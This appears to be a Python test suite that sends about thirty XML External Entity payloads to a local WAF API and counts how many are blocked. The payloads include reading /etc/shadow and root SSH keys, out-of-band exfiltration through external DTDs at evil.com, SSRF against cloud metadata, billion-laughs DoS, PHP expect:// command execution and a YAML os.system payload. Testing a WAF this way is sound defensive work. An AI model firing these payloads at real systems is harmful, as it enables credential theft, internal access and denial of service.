#!/usr/bin/env python3
"""
XML External Entity (XXE) Attack Test Suite
Tests XXE injection techniques against the WAF
"""

import requests
import json
import time
from typing import Dict

WAF_API = "http://localhost:3001/api/waf/check"

# XXE Attack Payloads
XXE_ATTACKS = [
    # Basic XXE - File Disclosure
    {
        "name": "Basic XXE passwd",
        "path": "/api/xml/parse",
        "body": """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>""",
        "content_type": "application/xml"
    },
    {
        "name": "XXE shadow file",
        "path": "/api/xml/import",
        "body": """<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><data>&xxe;</data>""",
        "content_type": "application/xml"
    },
    {
        "name": "XXE SSH key",
        "path": "/api/xml/load",
        "body": """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa">]><root>&xxe;</root>""",
        "content_type": "application/xml"
    },

    # XXE with Parameter Entities
    {
        "name": "Parameter entity XXE",
        "path": "/api/xml/process",
        "body": """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo>test</foo>""",
        "content_type": "application/xml"
    },
    {
        "name": "External DTD XXE",
        "path": "/api/xml/validate",
        "body": """<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://evil.com/xxe.dtd"><foo>test</foo>""",
        "content_type": "application/xml"
    },

    # Blind XXE - Out-of-Band
    {
        "name": "Blind XXE OOB HTTP",
        "path": "/api/xml/submit",
        "body": """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe">%xxe;]><foo>test</foo>""",
        "content_type": "application/xml"
    },
    {
        "name": "Blind XXE OOB FTP",
        "path": "/api/xml/upload",
        "body": """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "ftp://evil.com/xxe">%xxe;]><foo>test</foo>""",
        "content_type": "application/xml"
    },
    {
        "name": "Blind XXE data exfil",
        "path": "/api/xml/async",
        "body": """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://evil.com/xxe.dtd">%dtd;]><foo>test</foo>""",
        "content_type": "application/xml"
    },

    # XXE SSRF
    {
        "name": "XXE SSRF internal",
        "path": "/api/xml/fetch",
        "body": """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">]><foo>&xxe;</foo>""",
        "content_type": "application/xml"
    },
    {
        "name": "XXE SSRF metadata",
        "path": "/api/xml/cloud",
        "body": """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>""",
        "content_type": "application/xml"
    },
    {
        "name": "XXE SSRF internal port scan",
        "path": "/api/xml/scan",
        "body": """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:22/">]><foo>&xxe;</foo>""",
        "content_type": "application/xml"
    },

    # XXE DoS (Billion Laughs)
    {
        "name": "Billion laughs DoS",
        "path": "/api/xml/expand",
        "body": """<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">]><lolz>&lol4;</lolz>""",
        "content_type": "application/xml"
    },
    {
        "name": "Quadratic blowup",
        "path": "/api/xml/parse",
        "body": """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY a "AAAAAAAAAA">]><foo>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</foo>""",
        "content_type": "application/xml"
    },

    # XXE in Different Formats
    {
        "name": "XXE in SVG",
        "path": "/api/image/upload",
        "body": """<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>""",
        "content_type": "image/svg+xml"
    },
    {
        "name": "XXE in SOAP",
        "path": "/api/soap/request",
        "body": """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><request>&xxe;</request></soap:Body></soap:Envelope>""",
        "content_type": "text/xml"
    },
    {
        "name": "XXE in SAML",
        "path": "/api/auth/saml",
        "body": """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><samlp:AuthnRequest xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">&xxe;</samlp:AuthnRequest>""",
        "content_type": "application/xml"
    },
    {
        "name": "XXE in RSS",
        "path": "/api/feed/import",
        "body": """<?xml version="1.0"?><!DOCTYPE rss [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><rss><channel><title>&xxe;</title></channel></rss>""",
        "content_type": "application/rss+xml"
    },

    # XXE with PHP Wrappers
    {
        "name": "XXE PHP filter",
        "path": "/api/xml/php",
        "body": """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>""",
        "content_type": "application/xml"
    },
    {
        "name": "XXE PHP expect",
        "path": "/api/xml/exec",
        "body": """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>""",
        "content_type": "application/xml"
    },

    # XXE Bypass Techniques
    {
        "name": "XXE UTF-7 encoding",
        "path": "/api/xml/decode",
        "body": """<?xml version="1.0" encoding="UTF-7"?>+ADw-!DOCTYPE foo +AFs-+ADw-!ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4-+AF0-+AD4-+ADw-foo+AD4-+ACY-xxe+ADs-+ADw-/foo+AD4-""",
        "content_type": "application/xml"
    },
    {
        "name": "XXE UTF-16",
        "path": "/api/xml/unicode",
        "body": """<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>""",
        "content_type": "application/xml"
    },
    {
        "name": "XXE HTML entity bypass",
        "path": "/api/xml/entity",
        "body": """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:&#x2f;&#x2f;&#x2f;etc&#x2f;passwd">]><foo>&xxe;</foo>""",
        "content_type": "application/xml"
    },

    # XXE in JSON/YAML
    {
        "name": "YAML XXE",
        "path": "/api/yaml/parse",
        "body": """!!python/object/apply:os.system ['cat /etc/passwd']""",
        "content_type": "application/x-yaml"
    },
    {
        "name": "JSON to XML XXE",
        "path": "/api/convert",
        "body": {"data": "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>"},
        "content_type": "application/json"
    },

    # Document format XXE
    {
        "name": "DOCX XXE",
        "path": "/api/document/upload",
        "body": """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><document>&xxe;</document>""",
        "content_type": "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
    },
    {
        "name": "XLSX XXE",
        "path": "/api/spreadsheet/import",
        "body": """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><workbook>&xxe;</workbook>""",
        "content_type": "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
    },
    {
        "name": "PDF XFA XXE",
        "path": "/api/pdf/parse",
        "body": """<?xml version="1.0"?><!DOCTYPE xfa [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><xfa:data>&xxe;</xfa:data>""",
        "content_type": "application/pdf"
    },
]

def test_payload(attack: Dict) -> Dict:
    """Test a single XXE payload against WAF"""
    payload = {
        "method": "POST",
        "path": attack["path"],
        "query_params": {},
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Accept": "*/*",
            "Content-Type": attack.get("content_type", "application/xml")
        }
    }

    body = attack.get("body", "")
    payload["body"] = json.dumps(body) if isinstance(body, dict) else body

    try:
        response = requests.post(WAF_API, json=payload, timeout=10)
        result = response.json()
        return {
            "name": attack["name"],
            "detected": result.get("is_anomaly", False),
            "score": result.get("anomaly_score", 0),
            "time_ms": result.get("processing_time_ms", 0)
        }
    except Exception as e:
        return {"name": attack["name"], "error": str(e)}

def main():
    print("=" * 70)
    print("XML EXTERNAL ENTITY (XXE) ATTACK TEST SUITE")
    print("=" * 70)
    print(f"Testing {len(XXE_ATTACKS)} XXE payloads...\n")

    detected = 0
    missed = 0
    errors = 0

    for i, attack in enumerate(XXE_ATTACKS, 1):
        result = test_payload(attack)

        if "error" in result:
            status = "\033[93m[ERROR]\033[0m"
            errors += 1
        elif result["detected"]:
            status = "\033[92m[BLOCKED]\033[0m"
            detected += 1
        else:
            status = "\033[91m[MISSED]\033[0m"
            missed += 1

        score = result.get("score", 0)
        print(f"[{i:02d}/{len(XXE_ATTACKS)}] {status} {result['name'][:40]:<40} Score: {score:.4f}")
        time.sleep(0.05)

    print("\n" + "=" * 70)
    print("SUMMARY")
    print("=" * 70)
    print(f"Total Tests:  {len(XXE_ATTACKS)}")
    print(f"\033[92mBlocked:      {detected}\033[0m")
    print(f"\033[91mMissed:       {missed}\033[0m")
    print(f"\033[93mErrors:       {errors}\033[0m")
    detection_rate = detected / (len(XXE_ATTACKS) - errors) * 100 if (len(XXE_ATTACKS) - errors) > 0 else 0
    print(f"Detection Rate: {detection_rate:.1f}%")
    print("=" * 70)

if __name__ == "__main__":
    main()
